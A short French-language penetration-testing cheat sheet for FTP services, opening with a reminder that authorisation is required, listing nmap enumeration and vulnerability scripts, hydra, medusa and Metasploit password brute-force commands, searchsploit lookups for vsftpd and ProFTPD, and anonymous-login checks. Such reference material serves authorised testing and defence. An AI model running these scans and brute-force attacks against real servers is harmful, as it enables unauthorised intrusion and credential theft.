# FTP 

> Autorisation requise avant tout scan/exploit.

# Scan basique / version
```
nmap -sV -p 21 <IP>
```
# Scripts NSE FTP (énum + checks connus)
```
nmap -sV -p 21 --script "ftp-*" <IP>      # ftp-anon, ftp-syst, ftp-brute, ftp-vsftpd-backdoor, ...
```
# Matching vuln / CVE
```
nmap -sV -p 21 --script "vuln,vulners" <IP>
```
# Test anonymous uniquement
```
nmap -p 21 --script ftp-anon <IP>
```
# Brute-force (si autorisé) via Nmap NSE
```
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=passes.txt <IP>
```
# Brute-force externe (hydra)
```
hydra -L users.txt -P passwords.txt ftp://<IP> -t 8
```
# medusa
```
medusa -h <IP> -U users.txt -P passwords.txt -M ftp -t 16
```

# Recherche d'exploits connus
```
searchsploit vsftpd
searchsploit proftpd
searchsploit "vsftpd 2.3.4"
```

# Enum Metasploit (rapide)
```
msfconsole -q
search type:auxiliary ftp
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <IP>
set THREADS 10
run

use auxiliary/scanner/ftp/anon_login
set RHOSTS <IP>
run

use auxiliary/scanner/ftp/ftp_login
set RHOSTS <IP>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set THREADS 10
run
```

# Enum client simple (listing)
```
lftp -e "ls; bye" ftp://anonymous@<IP>
curl -v ftp://<IP>/path/to/file     # test récupération simple
```